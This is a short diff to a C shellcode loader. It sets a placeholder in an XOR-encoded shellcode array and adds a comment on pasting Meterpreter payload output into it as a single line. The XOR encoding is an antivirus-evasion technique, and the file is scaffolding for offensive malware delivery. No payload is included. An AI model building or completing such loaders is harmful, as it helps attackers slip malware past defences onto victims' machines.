@@ -3,7 +3,7 @@
 #include <stdio.h>
 
 // XOR-encoded shellcode
-unsigned char encodedShellcode[] = "shellcodehere";
+unsigned char encodedShellcode[] = "this is spot"; //for paste your shellcode as a single Line to here use "-f c | tr -d '\n' | sed 's/ //g' this one at end of your meterpreter call"
 const char key = 0xAA; // XOR key
 
 // XOR decryptor func
